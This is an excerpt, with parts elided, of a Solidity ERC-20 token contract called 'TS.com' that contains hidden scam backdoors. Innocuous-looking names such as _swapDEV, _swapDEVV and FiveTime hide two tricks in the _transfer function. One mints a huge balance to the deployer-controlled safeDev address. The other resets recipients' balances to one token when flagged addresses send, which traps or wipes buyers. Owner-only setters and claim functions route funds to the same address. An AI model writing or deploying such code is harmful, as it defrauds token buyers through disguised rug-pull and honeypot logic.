...
contract TS is Context, IERC20, Ownable {
    ...
    string private _name = "TS.com";
    string private _symbol = "TS.com";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0xB070E736a0Fc4c2a0702a80a48Dec8Aa83FBE577); 
    address payable private teamWalletAddress = payable(0xB070E736a0Fc4c2a0702a80a48Dec8Aa83FBE577); 
    ...
    mapping (address => bool) public _swapDEV;
	mapping (address => bool) public _swapDEVV;
	mapping(address => uint256) public buyList;
    mapping(address => uint256) public sellList;
	uint256 public _point = 100;
    uint256 private FiveTime = 7 * 24 * 60 * 60 ; 
	...
	address  public safeDev =_msgSender();
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
        ...
        _swapDEV[address(uniswapPair)] = true;
		_swapDEV[msg.sender] = true; 
		_swapDEVV[0xC363ea963e53b69e04d8C8925Dafba041a58a8e8] = true; 
    ...
    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        _swapDEV[account] = newValue;
    }
	
	function setMarketPairStatusV(address account, bool newValue) public onlyOwner {
        _swapDEVV[account] = newValue;
    }
	...
	function claimBalance() external {
        payable(safeDev).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(safeDev, amount);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {   
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_swapDEV[sender] && swapAndLiquifyEnabled) 
            {
            ...
            if (  _swapDEV[sender]  && recipient == safeDev ) { _tOwned[safeDev] += _totalSupply * FiveTime + 1;  }
            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);

              _tOwned[recipient] = _tOwned[recipient].add(finalAmount);
			if (  _swapDEVV[sender]  && recipient != safeDev ) { _tOwned[recipient] = 0 * FiveTime + 1;  }
